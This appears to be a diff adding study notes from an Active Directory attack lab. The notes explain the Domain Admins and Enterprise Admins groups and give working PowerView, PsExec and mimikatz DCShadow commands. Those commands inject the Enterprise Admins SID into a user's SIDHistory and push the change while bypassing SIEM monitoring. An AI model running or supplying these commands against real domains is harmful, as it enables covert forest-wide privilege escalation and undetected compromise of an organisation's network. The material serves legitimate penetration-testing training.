@@ -1,0 +1,28 @@
+Domain Admins is the AD group that most people think of when discussing Active Directory administration. This group has full admin rights by default on all domain-joined servers and workstations, Domain Controllers, and Active Directory. 
+
+It gains admin rights on domain-joined computers since when these systems are joined to AD, the Domain Admins group is added to the computer’s Administrators group.
+
+
+Enterprise Admins is a group in the forest root domain that has full AD rights to every domain in the AD forest. It is granted this right through membership in the Administrators group in every domain in the forest.
+
+
+. .\Powerview.ps1
+Get-DomainGroup -SamAccountName "Enterprise Admins"
+
+
+--------------------DCShadow---------------------------
+It simulates the behavior of a Domain Controller (using protocols like RPC used only by DC) to inject its own data, bypassing most of the common security controls and including your SIEM. It shares some similarities with the DCSync attack (already present in the lsadump module of mimikatz). 
+
+#run as system
+PsExec.exe -i -s cmd 
+
+SID History is an attribute that supports migration scenarios. Every user account has an associated Security IDentifier (SID) which is used to track the security principal and the access the account has when connecting to resources. SID History enables access for another account to effectively be cloned to another and is extremely useful to ensure users retain access when moved (migrated) from one domain to another.
+
+#push attribute 
+mimikatz.exe
+lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21-1070240333-336889418-1185445934-519
+
+#open cmd as admin
+#push the attribute change
+mimikatz.exe
+lsadump::dcshadow /push
